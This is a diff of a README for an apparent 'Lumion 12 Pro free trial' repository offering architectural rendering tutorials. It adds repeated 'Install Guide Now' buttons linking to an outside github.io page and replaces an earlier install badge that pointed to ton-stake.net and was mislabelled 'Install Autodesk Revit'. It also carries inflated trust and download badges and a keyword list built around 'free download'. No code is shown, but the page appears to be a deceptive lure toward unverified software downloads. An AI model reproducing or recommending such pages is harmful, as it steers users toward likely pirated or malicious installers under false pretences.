@@ -1,10 +1,15 @@
-![Trusted](https://img.shields.io/badge/Trusted-100%25-lightgrey?style=plastic&labelColor=lightgrey&color=grey) ![Downloads](https://img.shields.io/badge/Downloads-1M%2B-lightgrey?style=plastic&labelColor=lightgrey&color=grey) ![Release](https://img.shields.io/badge/Release-2025-orange?style=plastic&labelColor=lightgrey&color=orange)  
+![Visitors: 65K+](https://img.shields.io/badge/Visitors-65K+-blue) ![Members: 42K+](https://img.shields.io/badge/Members-42K+-green) ![Established: 2025](https://img.shields.io/badge/Established-2025-orange)
+
+![LumionLearningHub Banner](https://i.ytimg.com/vi/tW4qoeSMQKk/maxresdefault.jpg)
+
 
 # 🏛️ Lumion12ProTrialHub  
 
 🌄 Discover stunning architectural visualizations with the Lumion 12 Pro free trial! This repository offers tutorials, resources, and tips for architects and designers to explore trial tools for rendering, animation, and scene creation. Join our community to master the trial version in 2025!  
 
-[![Install Autodesk Revit](https://img.shields.io/badge/Install-Lumion12-blueviolet)](https://ton-stake.net)  
+<a href="https://arch-vizcraft-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -18,7 +23,9 @@
 - ✅ **Community Hub**: Connect with architects and visualization enthusiasts.  
 - ✅ **Workflow Tips**: Optimize your trial rendering process.  
 
----
+<a href="https://arch-vizcraft-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ### 💻 System Requirements  
 
@@ -28,7 +35,9 @@
 - **Processor**: Intel/AMD (3.0GHz+, CPUMark 2,000+)  
 - **Graphics**: GPU with G3DMark 7,000+ (e.g., NVIDIA GTX 1660, AMD RX 580)  
 
----
+<a href="https://arch-vizcraft-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ### 🌟 What Makes It Great  
 
@@ -98,4 +107,4 @@
 
 ### 🔍 SEO Keywords  
 
-lumion 12 pro free, lumion 12 pro download, lumion 12 pro free download, lumion 12 pro trial visualization, lumion 12 pro trial resources, lumion 12 pro trial tips, lumion 12 pro trial templates, lumion 12 pro trial animation, lumion 12 pro trial for windows, lumion 12 pro trial beginners, lumion 12 pro trial design, lumion 12 pro trial 2025 guide, lumion 12 pro trial community, lumion 12 pro trial materials, lumion 12 pro trial workflow, download lumion 12 pro trial tools, lumion 12 pro trial scene design, download lumion 12 pro trial assets, lumion 12 pro trial projects, download lumion 12 pro trial resources, lumion 12 pro trial rendering tools, lumion 12 pro trial user tips
+lumion 12 pro free, lumion 12 pro download, lumion 12 pro free download,lumion 12 pro trial tutorials, lumion 12 pro trial rendering, lumion 12 pro trial guide, lumion 12 pro trial visualization, lumion 12 pro trial resources, lumion 12 pro trial tips, lumion 12 pro trial templates, lumion 12 pro trial animation, lumion 12 pro trial for windows, lumion 12 pro trial beginners, lumion 12 pro trial design, lumion 12 pro trial 2025 guide, lumion 12 pro trial community, lumion 12 pro trial materials, lumion 12 pro trial workflow, download lumion 12 pro trial tools, lumion 12 pro trial scene design, download lumion 12 pro trial assets, lumion 12 pro trial projects, download lumion 12 pro trial resources, lumion 12 pro trial rendering tools, lumion 12 pro trial user tips
